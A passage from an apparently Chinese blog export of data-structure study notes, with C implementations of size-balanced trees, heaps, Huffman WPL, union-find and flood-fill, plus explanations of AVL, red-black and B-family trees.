predecessor(target); &#125; else if (target-&gt;rchild) &#123; tmp = successor(target); &#125; else &#123; tmp = target; &#125; target-&gt;data = tmp-&gt;data; remove_node(tmp); return OK;&#125;void clear(Node *node) &#123; if (node != NULL) &#123; if (node-&gt;lchild != NULL) &#123; clear(node-&gt;lchild); &#125; if (node-&gt;rchild != NULL) &#123; clear(node-&gt;rchild); &#125; free(node); &#125;&#125;int main() &#123; Node *binarytree = NULL; int arr[10] = &#123; 8, 9, 10, 3, 2, 1, 6, 4, 7, 5 &#125;; for (int i = 0; i &lt; 10; i++) &#123; binarytree = insert(binarytree, arr[i]); &#125; int value; scanf(\"%d\", &amp;value); if (search(binarytree, value) != NULL) &#123; printf(\"search success!\\n\"); &#125; else &#123; printf(\"search failed!\\n\"); &#125; scanf(\"%d\", &amp;value); if (delete_tree(binarytree, value)) &#123; printf(\"delete success!\\n\"); &#125; else &#123; printf(\"delete failed!\\n\"); &#125; clear(binarytree); return 0;&#125; 平衡二叉树 所有平衡二叉查找树基本由以下三个特征组成： 自平衡条件 旋转操作 旋转的触发 平衡二叉查找树通过设置合理的自平衡条件，使得二叉查找树的查找、插入等操作的性能不至于退化成 \\(O(n)\\). AVL 树是最早发明的一种平衡二叉查找树。 AVL AVL 树提出了一个概念： 平衡因子（balance factor） 。每个结点的平衡因子是指它左子树最大高度和右子树最大高度的差。 在 AVL 树中，平衡因子为 −1、 0、 1 的结点都被认为是平衡的，而平衡因子为 −2、 2 等其他值的结点被认为是不平衡的，需要对这个结点所在子树进行调整。 旋转 在 AVL 树中，一共有两种单旋操作：左旋和右旋。AVL 树通过一系列左旋和右旋操作，将不平衡的树调整为平衡二叉查找树。 通过进行左旋操作，使得原先的根 2 变成了其右孩子 4 的左孩子，而 4 原先的左孩子 3 变成了 2 的右孩子。 通过右旋操作，使得原先的根 5 变成了其左孩子 3 的右孩子，而 3 原先的右孩子变成了 5 的左孩子。 AVL 树中还有两种复合旋转操作（即“多旋”），由两次单旋操作组合而成。 左旋加右旋： 右旋加左旋： 旋转的触发 在插入一个元素后不断回溯的过程中，如果因此导致结点不平衡，则根据不平衡情况（一定是一边子树比另一边子树的高度大 2）进行对应的旋转： 左子树比右子树的高度大 2： 如果新增元素插入到左儿子的左子树中，则进行右旋操作。( LL 型调整 ) 如果新增元素插入到左儿子的右子树中，则进行左旋加右旋操作。（ LR 型调整 ） 右子树比左子树的高度大 2： 如果新增元素插入到右儿子的右子树中，则进行左旋操作。（ RR 型调整 ） 如果新增元素插入到右儿子的左子树中，则进行右旋加左旋操作。（ RL 型调整 ） 类似的，在删除一个元素后不断回溯的过程中，如果出现结点不平衡，则和插入操作采用相同的调整操作，确保在删除以后整棵树依然是平衡的。 Size Balanced Tree 对于 SBT，它的自平衡条件会显得稍微复杂一些：对于每个结点 t，同时满足： $$ size[right[t]]≥max(size[left[left[t]]],size[right[left[t]]]) \\ size[left[t]]≥max(size[left[right[t]]],size[right[right[t]]]) $$ size表示以该节点为根的子树中节点个数。 每个结点所在子树的结点个数，不小于其兄弟的两个孩子所在子树的结点个数的最大值。 旋转操作和 AVL 树的左旋右旋是完全一样的。 只是旋转的触发条件不同。 旋转的触发 在调整过程中，一共有 4 种会触发旋转的情况： LL 型（ size[left[left[t]]] &gt; size[right[t]] ）：首先对子树 t 执行右旋操作，旋转以后对 t 的右子树进行调整，之后再对子树 t 进行调整。 LR 型（ size[right[left[t]]] &gt; size[right[t]] ）：首先对 t 的左子树执行左旋操作，再对 t 进行右旋操作。之后分别调整结点 t 的左右子树，最终对结点 t进行调整。 RR 型（ size[right[right[t]]] &gt; size[left[t]] ）：首先对 t 执行左旋操作，旋转以后对 t 的左子树进行调整，之后再对 t 进行调整。 RL 型（ size[left[right[t]]] &gt; size[left[t]] ）：首先对结点 t 的右子树执行右旋操作，再对 t 进行左旋操作。之后分别调整 t 的左右子树，最终对 t 进行调整。 通过递归的进行调整，让不平衡的 SBTree 恢复平衡状态。 简化流程： 如果在处理左子树更高的情况： LL 型：右旋 t。 LR 型：左旋 t 的左子树，再右旋 t。 如果在处理右子树更高的情况： RR 型：左旋 t。 RL 型：右旋 t 的右子树，再左旋 t。 递归调整左子树中左子树的左子树更高的情况。 递归调整右子树中右子树的右子树更高的情况。 递归调整当前子树中左子树更高的情况。 递归调整当前子树中右子树更高的情况。 和 AVL 不太一样的是，SBTree 只有在插入时才可能触发调整，而不需要在删除结点以后进行调整 。 从理论上说，SBTree 和 AVL 树相比在均摊时间复杂度上没有区别，每次查询、插入和删除的时间复杂度都为 \\(O(\\log(n))\\)。 在实际运用中，SBTree 在查询操作较多的情况下会有效率上的优势。加之为了维护平衡性记录了每个结点所在子树大小（即子树内结点个数），相比其他平衡二叉查找树而言，更便于求解第 k 大元素、或求解元素的秩（rank）等类似问题。 实现 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#define ERROR 0#define OK 1typedef struct SBTNode &#123; int data, size; struct SBTNode *lchild, *rchild, *father;&#125;SBTNode;SBTNode* init(int init_data, int init_size, SBTNode *init_father);SBTNode *NIL;void init_NIL() &#123; NIL = (SBTNode *)malloc(sizeof(SBTNode)); NIL-&gt;data = 0; NIL-&gt;size = 0; NIL-&gt;lchild = NIL; NIL-&gt;rchild = NIL; NIL-&gt;father = NULL;&#125;SBTNode* init(int init_data, int init_size, SBTNode *init_father) &#123; SBTNode *node = (SBTNode *)malloc(sizeof(SBTNode)); node-&gt;data = init_data; node-&gt;size = init_size; node-&gt;lchild = NIL; node-&gt;rchild = NIL; node-&gt;father = init_father; return node;&#125;// 左旋实现，复杂一点的链表指向关系转移SBTNode* left_rotate(SBTNode *node) &#123; SBTNode *temp = node-&gt;rchild; node-&gt;rchild = temp-&gt;lchild; temp-&gt;lchild-&gt;father = node; temp-&gt;lchild = node; temp-&gt;father = node-&gt;father; node-&gt;father = temp; temp-&gt;size = node-&gt;size; node-&gt;size = node-&gt;lchild-&gt;size + node-&gt;rchild-&gt;size + 1; return temp;&#125;// 右旋实现，旋转操作的根节点为nodeSBTNode* right_rotate(SBTNode *node) &#123; SBTNode *temp = node-&gt;lchild; node-&gt;lchild = temp-&gt;rchild; temp-&gt;rchild-&gt;father = node; temp-&gt;rchild = node; temp-&gt;father = node-&gt;father; node-&gt;father = temp; temp-&gt;size = node-&gt;size; node-&gt;size = node-&gt;lchild-&gt;size + node-&gt;rchild-&gt;size + 1; return temp;&#125;// 递归调整平衡二叉树，以size为对比标准，flag指示子树哪一边size更大SBTNode* maintain(SBTNode *node, int flag) &#123; if (flag == 0) &#123; // 左子树中左子树size 大于 node的右子树，LL情况，使用右旋调整 if (node-&gt;lchild-&gt;lchild-&gt;size &gt; node-&gt;rchild-&gt;size) &#123; node = right_rotate(node); &#125; // LR, 先左旋再右旋 else if (node-&gt;lchild-&gt;rchild-&gt;size &gt; node-&gt;rchild-&gt;size) &#123; node-&gt;lchild = left_rotate(node-&gt;lchild); node = right_rotate(node); &#125; else &#123; return node; &#125; &#125; else &#123; // RR, 左旋 if (node-&gt;rchild-&gt;rchild-&gt;size &gt; node-&gt;lchild-&gt;size) &#123; node = left_rotate(node); &#125; // RL，先右旋再左旋 else if (node-&gt;rchild-&gt;lchild-&gt;size &gt; node-&gt;lchild-&gt;size) &#123; node-&gt;rchild = right_rotate(node-&gt;rchild); node = left_rotate(node); &#125; else &#123; return node; &#125; &#125; // 递归处理左右子树 node-&gt;lchild = maintain(node-&gt;lchild, 0); node-&gt;rchild = maintain(node-&gt;rchild, 1); // 当子树调整后，再处理 node 的平衡 node = maintain(node, 0); node = maintain(node, 1); return node;&#125;SBTNode* insert(SBTNode *node, int value) &#123; node-&gt;size++; if (value &gt; node-&gt;data) &#123; if (node-&gt;rchild == NIL) &#123; node-&gt;rchild = init(value, 1, node); &#125; else &#123; node-&gt;rchild = insert(node-&gt;rchild, value); &#125; &#125; else &#123; if (node-&gt;lchild == NIL) &#123; node-&gt;lchild = init(value, 1, node); &#125; else &#123; node-&gt;lchild = insert(node-&gt;lchild, value); &#125; &#125; return maintain(node, value &gt; node-&gt;data);&#125;SBTNode* search(SBTNode *node, int value) &#123; if (node == NIL || node-&gt;data == value) &#123; return node; &#125; else if (value &gt; node-&gt;data) &#123; if (node-&gt;rchild == NIL) &#123; return NIL; &#125; else &#123; return search(node-&gt;rchild, value); &#125; &#125; else &#123; if (node-&gt;lchild == NIL) &#123; return NIL; &#125; else &#123; return search(node-&gt;lchild, value); &#125; &#125;&#125;SBTNode* insert_node(SBTNode *node, int value) &#123; if (node == NULL) &#123; node = init(value, 1, NULL); return node; &#125; if (search(node, value) != NIL) &#123; return node; &#125; return insert(node, value);&#125;SBTNode* predecessor(SBTNode *node) &#123; SBTNode *temp = node-&gt;lchild; while (temp != NIL &amp;&amp; temp-&gt;rchild != NIL) &#123; temp = temp-&gt;rchild; &#125; return temp;&#125;SBTNode* successor(SBTNode *node) &#123; SBTNode *temp = node-&gt;rchild; while (temp != NIL &amp;&amp; temp-&gt;lchild != NIL) &#123; temp = temp-&gt;lchild; &#125; return temp;&#125;void remove_node(SBTNode *delete_node) &#123; SBTNode *temp = NIL; if (delete_node-&gt;lchild != NIL) &#123; temp = delete_node-&gt;lchild; temp-&gt;father = delete_node-&gt;father; delete_node-&gt;lchild = NIL; &#125; if (delete_node-&gt;rchild != NIL) &#123; temp = delete_node-&gt;rchild; temp-&gt;father = delete_node-&gt;father; delete_node-&gt;rchild = NIL; &#125; if (delete_node-&gt;father-&gt;lchild == delete_node) &#123; delete_node-&gt;father-&gt;lchild = temp; &#125; else &#123; delete_node-&gt;father-&gt;rchild = temp; &#125; temp = delete_node; while (temp != NULL) &#123; temp-&gt;size--; temp = temp-&gt;father; &#125; delete_node-&gt;lchild = NIL; delete_node-&gt;rchild = NIL; free(delete_node);&#125;int delete_tree(SBTNode *node, int value) &#123; SBTNode *delete_node, *current_node; current_node = search(node, value); if (current_node == NIL) &#123; return ERROR; &#125; if (current_node-&gt;lchild != NIL) &#123; delete_node = predecessor(current_node); &#125; else if (current_node-&gt;rchild != NIL) &#123; delete_node = successor(current_node); &#125; else &#123; delete_node = current_node; &#125; current_node-&gt;data = delete_node-&gt;data; remove_node(delete_node); return OK;&#125;void inorder(SBTNode *node) &#123; if (node == NIL) return; inorder(node-&gt;lchild); printf(\"%d \", node-&gt;data); inorder(node-&gt;rchild); return;&#125;void clear(SBTNode *node) &#123; if (node != NIL) &#123; if (node-&gt;lchild != NIL) &#123; clear(node-&gt;lchild); &#125; if (node-&gt;rchild != NIL) &#123; clear(node-&gt;rchild); &#125; free(node); &#125;&#125;int main() &#123; init_NIL(); SBTNode *binarytree = NULL; int arr[10] = &#123; 8, 9, 10, 3, 2, 1, 6, 4, 7, 5 &#125;; for (int i = 0; i &lt; 10; i++) &#123; binarytree = insert_node(binarytree, arr[i]); &#125; int value; scanf(\"%d\", &amp;value); if (search(binarytree, value) != NIL) &#123; printf(\"search success!\\n\"); &#125; else &#123; printf(\"search failed!\\n\"); &#125; scanf(\"%d\", &amp;value); if (delete_tree(binarytree, value)) &#123; printf(\"delete success!\\n\"); &#125; else &#123; printf(\"delete failed!\\n\"); &#125; clear(binarytree); return 0;&#125; 求解第k小元素 只需要在SBTree基础上，增加一个函数 select_a。SBTree记录了树的size，所以找到某个大小的元素比较便利。 12345678910111213141516171819202122232425...int select_a(SBTNode *node, int k) &#123; int rank = node-&gt;lchild-&gt;size + 1; if (rank == k) &#123; return node-&gt;data; &#125; else if (k &lt; rank) &#123; return select_a(node-&gt;lchild, k); &#125; else &#123; return select_a(node-&gt;rchild, k - rank); &#125;&#125;int main() &#123; init_NIL(); SBTNode *binarytree = NULL; int arr[10] = &#123; 8, 9, 10, 3, 2, 1, 6, 4, 7, 5 &#125;; for (int i = 0; i &lt; 10; i++) &#123; binarytree = insert_node(binarytree, arr[i]); &#125; int k; scanf(\"%d\", &amp;k); printf(\"%d\\n\", select_a(binarytree, k)); clear(binarytree); return 0;&#125; RBTree 红黑树（Red-Black Tree） 也是一种自平衡的二叉查找树。1972 年由 Rudolf Bayer 发明的，而“红黑树”的名字是由 Leo J. Guibas 和 Robert Sedgewick （写 《算法》的普林斯顿大佬）于 1978 年首次提出。 红黑树相比于 AVL，牺牲了部分平衡性以在插入、删除操作时减少旋转操作，整体性能优于 AVL，也正因如此，C++ STL 中的 map 就是用红黑树实现的。 红黑树和其他平衡二叉查找树相比，增加了一个 颜色 属性，用来标识树上的结点是红色还是黑色；并且如果一个结点没有子结点，则该结点的子节点对应的指针为 NIL，也就是说，红黑树的所有叶子都是 NIL。 红黑树是满足如下条件的二叉查找树： 每个结点要么是红色，要么是黑色； 根结点是黑色； 叶结点（NIL）是黑色； 如果一个结点是红色，则它的两个子节点都是黑色的； 从根结点出发到所有叶结点的路径上，均包含相同数目的黑色结点。 第五条规则是红黑树平衡性的核心。 因为第四条和第五条规则的限制，使得红黑树上从根结点到每个叶结点的最长路径最多是最短路径的两倍，这也确保了整棵二叉查找树是平衡的。 红黑树插入 插入分为四种情况，且插入节点默认为红色： 新结点 x 位于树的根 根据第二条规则，将新结点的颜色改为黑色。 x 的叔父结点（父节点的兄弟）是红色 此时 x 的祖父结点一定是黑色的。 将祖父结点的黑色改为红色，并将 x 的父结点和叔父结点改为黑色。之后将 x 的祖父结点作为 x 继续向上迭代（直到根节点）。 x 的叔父结点是黑色的，并且 x 是一个右孩子 对 x 的父结点进行左旋，原父结点仍为红色，叔父结点仍为黑色。进行第四种情况操作，且在第四种情况中，x代表左旋前的父节点。 x 的叔父结点是黑色的，并且 x 是一个左孩子 将 x 的父结点改为黑色，祖父结点改为红色，并对 x 的祖父结点进行右旋。 删除操作不写了，有点麻烦，也没那个兴趣从头实现，比较复杂的算法，照着伪代码实现挺耗时间的。 多路平衡二叉树 在数据量较大的工程应用（如数据库）中，由于树中的结点信息往往保存在磁盘而非内存里，维护一棵平衡二叉查找树会导致大量的磁盘寻址和读写操作。而磁盘存取的时间要比 CPU 运算的时间更长。 为了解决这个问题，可以通过每次存取连续多个数据项，来减少磁盘读写的时间开销。 平衡树是检索效率非常高的一类数据结构，但平衡树每个结点只能保存一个关键字。为了便于一次从磁盘中读入连续的多个数据，多路查找树来了。 将二叉查找改为多路查找，可以在降低查找深度的同时，在同一个结点内维护更多的信息，每次存取连续多个数据项，降低磁盘寻址和读写的时间开销，优化在磁盘上检索数据的性能。 多路查找树（Multi-way search tree） 是指树中结点最多有 M 个孩子。查找的时间效率依然可以保证为 \\(O(\\log(n))\\) 复杂度，并且树的深度更小。 2-3树 在 2-3 树中，有两种结点：2-node 和 3-node，表示每个结点有 2 个还是 3 个孩子。 树中的 所有叶子结点都在同一层 ，叶子结点可以包含一个或两个关键字。 2-node 一定 有两个孩子和一个关键字；3-node 一定 有三个孩子和两个关键字。 3-node有三个子树，两个关键字的值划分了三段连续的区间，三个子树分别位于这三个区间内。 B树 一棵最小度数为 t (t &gt;= 2) 的 B 树除了满足多路查找树的基本性质以外，还满足如下的性质： 根结点至少有一个关键字，以及两个孩子结点； 所有内部结点至少有 t 个孩子结点，至多有 2t 个孩子结点； 所有内部结点至少有 t−1 个关键字，至多有 2t−1 个关键字； 每个叶子结点没有孩子。 查找 123456789search(node, key) i = 0 while i &lt; node-&gt;count and key &gt; node-&gt;keys[i] i = i + 1 if i &lt; node-&gt;count and key == node-&gt;keys[i] return (node, i) else if node-&gt;is_leaf return NIL else return search(node-&gt;childs[i], key) 每个node有count个子节点。 插入 节点的子节点个数是可以变化的，所以当达到一个节点的最大度数（或者关键字个数）需要将子节点中合适的关键字提升到父节点中，若父节点也满了，就继续提升。划分出更小的节点，再进行插入。 删除 B 树的删除操作需要在递归过程中确保所在结点的关键字个数 不小于 最小度数 t。 B+ 树 B+ 树和 B 树的不同之处在于： 所有关键字都存放在叶结点中，非叶结点的关键字表示的是子树中所有关键字的最小值，这被称为 最小复写码 。也可以统一存储子树所有关键字的最大值。 叶结点包含了全部的关键字信息，并且叶结点之间按从小到大的顺序链接。 非叶子结点内并不需要真正保存关键字的具体信息，因此整体的磁盘读写开销会更小。 遍历叶子结点就可以从小到大遍历相邻的元素。 因此，现有的数据库索引大多采用 B+ 树作为索引数据结构。 B * 树 在 B* 树中，内部结点（非根、非叶子）也增加了一个指向兄弟的指针。并且每个结点的关键字个数至少为关键字个数上限的 \\(\\frac{2}{3}\\)。因为对下限的调整，所以 B * 树的空间使用率比 B 树和 B+ 树更高。","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"Data Structure","slug":"Notes/Data-Structure","permalink":"https://racleray.github.io/categories/Notes/Data-Structure/"}],"tags":[{"name":"data structure","slug":"data-structure","permalink":"https://racleray.github.io/tags/data-structure/"},{"name":"cs basic","slug":"cs-basic","permalink":"https://racleray.github.io/tags/cs-basic/"}],"author":"HeRui"},{"title":"数据结构整理-part3","slug":"数据结构整理-part3","date":"2021-10-08T13:30:33.000Z","updated":"2023-08-07T11:54:31.043Z","comments":true,"path":"posts/3626ce4c.html","link":"","permalink":"https://racleray.github.io/posts/3626ce4c.html","excerpt":"常见基本数据结构整理第三部分，使用C语言编写。","text":"堆与优先队列 堆可以看成是一棵完全二叉树，除最后一层以外，它的每一层都是填满的，最后一层从左到右依次填入。 根结点权值大于等于树中任意结点权值的堆称为大根堆。 根结点权值小于等于树中任意结点权值的堆则称为小根堆。 并不需要真的维护一棵完全二叉树，而只需用一个数组来存储，堆按从上到下，从左到右的顺序，依次存储在下标从 1 开始的数组里。 元素插入，先添加到完全二叉树的最后一位之后，然后对比与父节点的关系，判断是否交换与父节点的位置。 元素删除，先对调堆顶元素与完全二叉树最后一个元素，删除最后一个元素，然后从堆顶开始调整二叉树的堆序性。 堆排序，和元素删除类似，只是不删除对调之后的最后一个元素，只是将序列尾部 index 减一。直到 index 等于 0。 总而言之，挺简单的。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;typedef struct Heap &#123; int *data, size;&#125; Heap;void init(Heap *h, int length_input) &#123; h-&gt;data = (int *)malloc(sizeof(int) * length_input); h-&gt;size = 0;&#125;void swap(int *a, int *b) &#123; int temp = *a; *a = *b; *b = temp;&#125;void push(Heap *h, int value) &#123; h-&gt;data[h-&gt;size] = value; int cur = h-&gt;size; int parent = (cur - 1) / 2; while (h-&gt;data[cur] &gt; h-&gt;data[parent]) &#123; swap(&amp;h-&gt;data[cur], &amp;h-&gt;data[parent]); cur = parent; parent = (cur - 1) / 2; &#125; h-&gt;size++;&#125;void output(Heap *h) &#123; for (int i = 0; i &lt; h-&gt;size; i++) &#123; (i &gt; 0) &amp;&amp; printf(\" \"); printf(\"%d \", h-&gt;data[i]); &#125; printf(\"\\n\");&#125;int top(Heap *h) &#123; return h-&gt;data[0];&#125;void update(Heap *h, int pos, int n) &#123; int lchild = 2 * pos + 1, rchild = 2 * pos + 2; int max_idx = pos; if (h-&gt;data[lchild] &gt; h-&gt;data[max_idx] &amp;&amp; lchild &lt; n) max_idx = lchild; if (rchild &lt; n &amp;&amp; h-&gt;data[rchild] &gt; h-&gt;data[max_idx]) max_idx = rchild; if (max_idx != pos) &#123; swap(&amp;h-&gt;data[max_idx], &amp;h-&gt;data[pos]); update(h, max_idx, n); &#125; return;&#125;void pop(Heap *h) &#123; swap(&amp;h-&gt;data[0], &amp;h-&gt;data[--h-&gt;size]); update(h, 0, h-&gt;size);&#125;void heap_sort(Heap *h) &#123; for (int i = h-&gt;size - 1; i &gt; 0; i--) &#123; swap(&amp;h-&gt;data[i], &amp;h-&gt;data[0]); update(h, 0, i); &#125;&#125;void clear(Heap *h) &#123; free(h-&gt;data); free(h);&#125;int main() &#123; Heap *h = (Heap *)malloc(sizeof(Heap)); init(h, 105); int n; scanf(\"%d\", &amp;n); for (int i = 0, val; i &lt; n; i++) &#123; scanf(\"%d\", &amp;val); push(h, val); &#125; int m; scanf(\"%d\", &amp;m); while (m--) &#123; printf(\"%d\\n\", top(h)); pop(h); &#125; output(h); heap_sort(h); output(h); clear(h); return 0;&#125; 优先队列 在 C++ 的 STL 里，有封装好的优先队列priority_queue，它包含在头文件&lt;queue&gt;里。优先级可以自己定义，默认优先级是权值大的元素优先级高。 字符串Huffman编码 建立Huffman树的方法，在总结 树 的部分有说明。 首先统计每个字母在字符串里出现的频率，把每个字母看成一个结点，结点的权值即是字母出现的频率。 把每个结点看成一棵只有根结点的二叉树，一开始把所有二叉树（结点）都放在一个集合里，接下来开始如下编码： 步骤一：从集合里取出两个根结点权值最小的树a和b，构造出一棵新的二叉树c，二叉树c的根结点的权值为a和b的根结点权值和，二叉树c的左右子树分别是a和b。（合并） 步骤二：将二叉树a和b从集合里删除，把二叉树c加入集合里。（更新候选） 重复以上两个步骤，直到集合里只剩下一棵二叉树，最后剩下的就是哈夫曼树了。 规定每个有孩子的结点，到左孩子的路径为 0，到右孩子的路径为 1。每个字母的编码就是根结点到字母对应结点的路径。 计算字符串进行哈夫曼编码后的长度，即哈夫曼树的带权路径长度 WPL（Weighted Path Length），也就是每个叶子结点到根结点的距离乘以叶子结点权值结果之和。 一种简单的计算方法是：当哈夫曼树上结点总个数大于 1 时，哈夫曼树的 WPL，等于树上除根结点之外的所有结点的权值之和。如果结点总个数为 1，则哈夫曼树的 WPL 即为根结点权值。 想想Huffman树建立的过程，这种简单的计算WPL的方法，挺直观的。 利用小根堆计算Huffman树的WPL 不考虑建立二叉树的步骤，只累加计算每次作为插入结点的权值之和就能得到结果。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;typedef struct Heap &#123; int *data, size;&#125; Heap;void init(Heap *h, int length_input) &#123; h-&gt;data = (int *)malloc(sizeof(int) * length_input); h-&gt;size = 0;&#125;void swap(int *a, int *b) &#123; int temp = *a; *a = *b; *b = temp;&#125;void push(Heap *h, int value) &#123; h-&gt;data[h-&gt;size] = value; int current = h-&gt;size; int father = (current - 1) / 2; while (h-&gt;data[current] &lt; h-&gt;data[father]) &#123; swap(&amp;h-&gt;data[current], &amp;h-&gt;data[father]); current = father; father = (current - 1) / 2; &#125; h-&gt;size++;&#125;int top(Heap *h) &#123; return h-&gt;data[0];&#125;void update(Heap *h, int pos, int n) &#123; int lchild = 2 * pos + 1, rchild = 2 * pos + 2; int max_value = pos; if (lchild &lt; n &amp;&amp; h-&gt;data[lchild] &lt; h-&gt;data[max_value]) &#123; max_value = lchild; &#125; if (rchild &lt; n &amp;&amp; h-&gt;data[rchild] &lt; h-&gt;data[max_value]) &#123; max_value = rchild; &#125; if (max_value != pos) &#123; swap(&amp;h-&gt;data[pos], &amp;h-&gt;data[max_value]); update(h, max_value, n); &#125;&#125;void pop(Heap *h) &#123; swap(&amp;h-&gt;data[0], &amp;h-&gt;data[h-&gt;size - 1]); h-&gt;size--; update(h, 0, h-&gt;size);&#125;int heap_size(Heap *h) &#123; return h-&gt;size;&#125;void clear(Heap *h) &#123; free(h-&gt;data); free(h);&#125;int main() &#123; int n, value, ans = 0; scanf(\"%d\", &amp;n); Heap *heap = (Heap *)malloc(sizeof(Heap)); init(heap, n); for (int i = 1; i &lt;= n; i++) &#123; scanf(\"%d\", &amp;value); push(heap, value); &#125; if (n == 1) &#123; ans = ans + top(heap); &#125; while (heap_size(heap) &gt; 1) &#123; int a = top(heap); pop(heap); int b = top(heap); pop(heap); ans = ans + a + b; push(heap, a + b); &#125; printf(\"%d\\n\", ans); clear(heap); return 0;&#125; 并查集 在数据结构里，森林是指若干棵互不相交的树的集合。 并查集（Merge-Find Set），也被称为不相交集合（Disjoint Set），是用于解决若干的不相交集合检索关系的数据结构。 一般并查集有以下几种操作： MAKE-SET(x)：初始化操作，建立一个只包含元素 x 的集合。 UNION(x, y)：合并操作，将包含 x 和 y 的集合合并为一个新的集合。 FIND-SET(x)：查询操作，计算 x 所在的集合。 “并查集”这个词通常既可以指代不相交集合的数据结构，也可以表示其对应的算法。其在有些教材中的英文名称也叫做 Disjoint Set Union，表示用于求不相交集合并集的相关算法。 并查集用有根树来表示集合，树中的每一个结点都对应集合的一个成员，每棵树表示一个集合。 每个成员都有一条指向父结点的边，整个有根树通过这些指向父结点的边来维护。 每棵树的根就是这个集合的代表，并且根的父结点是它自己。 并查集的查询操作，指的是查找出指定元素所在有根树的根结点是谁。 并查集的合并操作需要用到查询操作的结果。合并两个元素所在的集合，需要首先求出两个元素所在集合的根。接下来将其中一个根结点的父亲设置为另一个根结点。 优化方法 并查集的查询操作最坏情况下的时间复杂度为 \\(O(n)\\) 退化成一个单链表。 其优化方法是，在合并时，将高度较低的树接到高度较高的树根上，可以防止树退化成一条链。 利用一个数组保存每个节点的所在树的节点总数，即保存每个节点的秩（可视为height）。 分别获得传入的两个节点所在的树的根节点。 比较两个根节点是否，相同则返回 false，结束合并操作、 若两个根节点的秩不同，比较他们的秩的大小。 将秩较小的根节点的父指针指向秩较大的跟节点。 更新合并后的根节点的秩，返回 true，结束合并操作。 通过路径压缩的方法可以进一步减少均摊复杂度，此时同一个集合内的节点可以一步找到根节点。同时使用这两种优化方法，可以将每次操作的时间复杂度优化至接近常数级。 路径压缩指，在进行路径压缩优化时只需在查找根节点时，将待查找的节点的父指针指向它所在的树的根节点。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;typedef struct DisjointSet&#123; int *father, *rank;&#125; DisjointSet;void init(DisjointSet *s, int size) &#123; s-&gt;father = (int *)malloc(sizeof(int) * size); s-&gt;rank = (int *)malloc(sizeof(int) * size); for (int i = 0; i &lt; size; ++i) &#123; s-&gt;father[i] = i; s-&gt;rank[i] = 1; &#125;&#125;void swap(int *a, int *b) &#123; int temp = *a; *a = *b; *b = temp;&#125;int max(int a, int b) &#123; return a &gt; b ? a : b;&#125;int find_set(DisjointSet *s, int node) &#123; if (s-&gt;father[node] != node) &#123; // 递归找到根节点，node的father指向根节点 s-&gt;father[node] = find_set(s, s-&gt;father[node]); &#125; // 回溯过程中，路径上node的father都指向根 return s-&gt;father[node];&#125;// 根据高度合并int merge(DisjointSet *s, int node1, int node2) &#123; int ancestor1 = find_set(s, node1); int ancestor2 = find_set(s, node2); if (ancestor1 != ancestor2) &#123; if (s-&gt;rank[ancestor1] &gt; s-&gt;rank[ancestor2]) &#123; swap(&amp;ancestor1, &amp;ancestor2); &#125; s-&gt;father[ancestor1] = ancestor2; s-&gt;rank[ancestor2] = max(s-&gt;rank[ancestor2], s-&gt;rank[ancestor1] + 1); return 1; &#125; return 0;&#125;void clear(DisjointSet *s) &#123; free(s-&gt;father); free(s-&gt;rank); free(s);&#125;int main() &#123; DisjointSet *dsu = (DisjointSet *)malloc(sizeof(DisjointSet)); init(dsu, 100); int m, x, y; scanf(\"%d\", &amp;m); for (int i = 0; i &lt; m; ++i) &#123; scanf(\"%d%d\", &amp;x, &amp;y); int ans = merge(dsu, x, y); if (ans) &#123; printf(\"success\\n\"); &#125; else &#123; printf(\"failed\\n\"); &#125; &#125; clear(dsu); return 0;&#125; 连通分量 连通分量就是图 G 的最大连通子图。对于一个无向图，使用FloodFill算法可以求得连通分量。 找到一个没有染色的顶点，将其染为新的颜色 \\(Color_{new}\\)，如果没有则算法结束。 初始化一个空的队列，并将第一步的顶点插入队列。 不断获得队首元素的值并弹出，将和队首元素相邻的未染色顶点染为 \\(Color_{new}\\)，并将其加入队列。 重复执行第一步，直到所有顶点都被染色，算法结束。 FloodFill 的时间复杂度是 \\(O(V+E)\\)，其中广度优先遍历的部分可以替换成深度优先遍历，复杂度是一样的。通常考虑到递归调用的时间开销，往往广度优先遍历的效率要更高一些。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#define MAX_N 1000typedef struct Graph &#123; int n; int color[MAX_N]; int mat[MAX_N][MAX_N];&#125; Graph;void init_Graph(Graph *g, int input_n) &#123; g-&gt;n = input_n; for (int i = 0; i &lt; g-&gt;n; i++) &#123; g-&gt;color[i] = 0; for (int j = 0; j &lt; g-&gt;n; j++) &#123; g-&gt;mat[i][j] = 0; &#125; &#125;&#125;void insert(Graph *g, int x, int y) &#123; g-&gt;mat[x][y] = 1; g-&gt;mat[y][x] = 1;&#125;void floodfill(Graph *g) &#123; int color_cnt = 0; int q[MAX_N]; for (int i = 0; i &lt; g-&gt;n; ++i) &#123; if (g-&gt;color[i] == 0) &#123; color_cnt++; g-&gt;color[i] = color_cnt; int l = 0, r = 0; q[r++] = i; // 遍历相邻未染色节点，通过队列，广度优先染色 while (l &lt; r) &#123; int vertex = q[l++]; for (int j = 0; j &lt; g-&gt;n; j++) &#123; if (g-&gt;mat[vertex][j] &amp;&amp; g-&gt;color[j] == 0) &#123; g-&gt;color[j] = color_cnt; q[r++] = j; &#125; &#125; &#125; &#125; &#125; // output print for (int i = 0; i &lt; g-&gt;n; ++i) &#123; printf(\"%d %d\\n\", i, g-&gt;color[i]); &#125;&#125;int main() &#123; int n, m; scanf(\"%d %d\", &amp;n, &amp;m); Graph *g = (Graph 